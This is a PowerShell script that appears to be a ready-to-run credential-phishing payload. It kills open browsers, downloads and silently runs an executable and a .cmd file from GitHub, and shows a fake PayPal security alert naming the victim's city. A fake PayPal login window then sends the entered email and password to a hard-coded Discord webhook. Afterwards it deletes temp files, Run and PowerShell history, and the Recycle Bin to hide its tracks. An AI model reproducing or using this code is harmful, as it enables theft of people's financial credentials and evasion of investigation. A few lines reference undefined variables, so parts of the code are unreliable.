Stop-Process -Name "MP" -Force -ErrorAction SilentlyContinue
# Define the Upload-Discord function
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "https://discord.com/api/webhooks/1171563379874340874/yWRq-Ehof2YQ3ycRswEtfDtSWc_ZJwcomxwhCGYxU8uubem_Llurm9yPW4sfJk7H6bMn"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $hookurl
    }
}

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
$creds | Out-File -FilePath "$env:TEMP\$FileName" -Encoding utf8
Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase


#----------------------------------------------------------------------------------------------------

# Get the default user directory
$userDirectory = [System.IO.Path]::Combine($env:USERPROFILE, 'Library')

# Check if the "Library" folder exists, and create it if not
if (-not (Test-Path -Path $userDirectory -PathType Container)) {
    New-Item -ItemType Directory -Path $userDirectory | Out-Null
}


# Set the URL and output path
$url = "https://github.com/Wesley5n1p35/psh/raw/main/properties.exe"
$outputPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Library\properties.exe')

# Download the exe
Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing

$cmdScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/play.cmd"
$cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")

# Download the .cmd script from the URL
Invoke-WebRequest -Uri $cmdScriptUrl -OutFile $cmdScriptPath -UseBasicParsing

# Check if the script file exists
if (Test-Path $cmdScriptPath -PathType Leaf) {
    Write-Host "Script file found at $cmdScriptPath"
    
    # Execute the .cmd script with the window closed
    Start-Process -FilePath $cmdScriptPath -ArgumentList "/c",$cmdScriptPath -WindowStyle Hidden
} else {
    Write-Host "Script file not found at $cmdScriptPath"
}


$browserProcesses = "chrome", "firefox", "iexplore", "edge", "opera"

$browserProcesses | ForEach-Object {
    Get-Process -Name $_ -ErrorAction SilentlyContinue | ForEach-Object {
        $_.CloseMainWindow()
        if (!$_.HasExited) { $_.Kill() }
    }
}

Add-Type -AssemblyName PresentationCore, PresentationFramework

# Define the API base URL
$apiUrl = "http://ip-api.com/json/"

# Get the computer's external IP address
$ipAddress = (Invoke-RestMethod -Uri "http://ipinfo.io/json").ip

# Query the IP-API service to get location information
$response = Invoke-RestMethod -Uri "$apiUrl$ipAddress"

# Extract location data
$city = $response.city
$region = $response.regionName

# Create a message for the user
$msgBody = "Someone is trying to access your Paypal account from $city,$region.`nPlease sign back in to secure your account"
$msgTitle = "Was this you?"
$msgButton = 'Ok'
$msgImage = 'Warning'

# Show a message box with location information
$Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)

# Define the URL to the image hosted on GitHub
$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/Security.png"

# Create XAML for the login window without specifying the icon
$XAML = @"
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="Paypal Security" Height="1000" Width="1000" WindowStartupLocation="CenterScreen">
    <Grid>
        <Image Source="$imageUrl" Stretch="Fill" />
        <Grid Background="Transparent">
            <Grid.RowDefinitions>
                <RowDefinition Height="*"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="20"/> <!-- Empty row with 20 units of height -->
            </Grid.RowDefinitions>
            <TextBlock Grid.Row="0" Text="" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" Foreground="White"/>

            <StackPanel Grid.Row="1" Orientation="Vertical" HorizontalAlignment="Center">
                <Label Content="Email" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Left" FontSize="30"/>
                <TextBox Name="Username" VerticalAlignment="Center" Margin="0" Height="21" Width="180" HorizontalAlignment="Center"/>
            </StackPanel>

            <StackPanel Grid.Row="2" Orientation="Vertical" HorizontalAlignment="Center">
                <Label Content="Password" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Left" FontSize="30"/>
                <PasswordBox Name="Password" VerticalAlignment="Center" Margin="0" Height="21" Width="180" HorizontalAlignment="Center"/>
            </StackPanel>

            <Button Grid.Row="3" Content="Login" HorizontalAlignment="Center" Margin="30" VerticalAlignment="Top" Width="100" Name="LoginButton" FontSize="25"/>
        </Grid>
    </Grid>
</Window>
"@

# Load the XAML and create a Window object
$loginWindow = [Windows.Markup.XamlReader]::Load([System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML))

# Set the window icon using the icon file we downloaded
$loginWindow.Icon = [System.Windows.Media.Imaging.BitmapFrame]::Create([System.Windows.Media.Imaging.BitmapImage]::new([System.Uri]::new($iconFilePath)))

# Create a XML reader for the XAML
$reader = [System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML)

# Load the XAML and create a Window object
$loginWindow = [Windows.Markup.XamlReader]::Load($reader)

# Define an event handler for the Login button
$loginButton = $loginWindow.FindName("LoginButton")
$loginButton.Add_Click({
    $enteredUsername = $loginWindow.FindName("Username").Text
    $enteredPassword = $loginWindow.FindName("Password").Password

    # Send the collected data to Discord
    $creds = "Paypal`nEmail: $enteredUsername`nPassword: $enteredPassword"
    Upload-Discord -text $creds

    # Save the data to a file
    $fileName = "$env:USERNAME-$(Get-Date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
    $creds | Out-File -FilePath "$env:TEMP\$fileName" -Encoding utf8

    # Add your code for uploading the file to Dropbox here

    $loginWindow.Close()
})

# Show the login window
$loginWindow.ShowDialog()


Add-Type -AssemblyName PresentationCore, PresentationFramework
# Create a message for the user
$msgBody = "ACCOUNT IS SECURE"
$msgTitle = "Paypal Security"
$msgButton = 'Ok'
$msgImage = 'Information'

# Show a message box with location information
$Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
#------------------------------------------------------------------------------------------------------------------------------------

$URL = "https://www.paypal.com"

# Check if Google Chrome is installed
$ChromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"  # Update this path to match your Chrome installation path
$chromeInstalled = Test-Path $ChromePath

if ($chromeInstalled) {
    # If Chrome is installed, open Facebook in Chrome
    Start-Process $ChromePath $URL
} else {
    # If Chrome is not installed, use the default browser
    Start-Process $URL
}

Start-Sleep -Seconds 180
Remove-Item -Path "$env:USERPROFILE\Library" -Recurse -Force


rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
